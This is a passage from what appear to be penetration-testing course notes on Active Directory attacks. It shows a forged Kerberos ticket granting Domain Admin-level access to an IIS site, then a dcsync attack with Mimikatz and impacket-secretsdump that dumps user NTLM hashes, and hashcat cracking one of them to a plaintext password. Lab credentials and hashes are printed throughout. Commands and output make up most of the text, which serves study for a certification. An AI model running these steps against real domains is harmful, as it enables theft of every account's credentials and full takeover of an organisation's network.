Lifetime  : 4/22/2024 2:04:11 PM ; 4/20/2034 2:04:11 PM ; 4/20/2034 2:04:11 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session

// confirm ticket is in memory

PS> klist
Current LogonId is 0:0x30dc73

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 4/22/2024 14:04:11 (local)
        End Time:   4/20/2034 14:04:11 (local)
        Renew Time: 4/20/2034 14:04:11 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

A new service ticket for the SPN HTTP/web04.corp.com has been loaded into memory and Mimikatz set appropriate group membership permissions in the forged ticket. From the perspective of the IIS application, the current user will be both the built-in local administrator ( Relative Id: 500 ) and a member of several highly-privileged groups, including the Domain Admins group ( Relative Id: 512 ).

```console
// verify access

PS> iwr -UseDefaultCredentials http://web04
PS C:\Tools> iwr -UseDefaultCredentials http://web04

StatusCode        : 200
StatusDescription : OK

// to get the source code immediately
PS> PS C:\Tools> (iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"
```

We now have access to the web page as jeffadmin. We did not need access to the plaintext password or password hash of this user!

Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.

### Domain Controller Synchronization

In production environments, domains typically rely on more than one domain controller to provide redundancy. The Directory Replication Service (DRS) Remote Protocol uses replication to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the IDL_DRSGetNCChanges API. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.

To do this, a user needs to have the following rights, which, by default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.
- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set

If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.

```console
kali$ xfreerdp /cert-ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.208.75 /drive:shared,/tmp

PS> .\mimikatz.exe

mimikatz# lsadump::dcsync /user:corp\dave

mimikatz# lsadump::dcsync /user:corp\dave
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : dave

** SAM ACCOUNT **

SAM Username         : dave
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration   :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID   : 1103

Credentials:
  Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494  // here it is!!!
    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d

// copy it over to kali

kali$ hashcat -m 1000 hashes.dcsync /home/kali/Desktop/oscp/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
08d7a47a6f9f66b97b1bae4178747494:Flowers1 
```

We can now obtain the NTLM hash of any domain user account of the domain corp.com. Notably, we can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator Administrator.

```console
mimikatz# lsadump::dcsync /user:corp\Administrator
```

Let's perform dcsync from Linux now.

```console
kali$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.208.70
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
[*] Cleaning up...

// we only need this emd of the hash: "08d7a47a6f9f66b97b1bae4178747494"
```
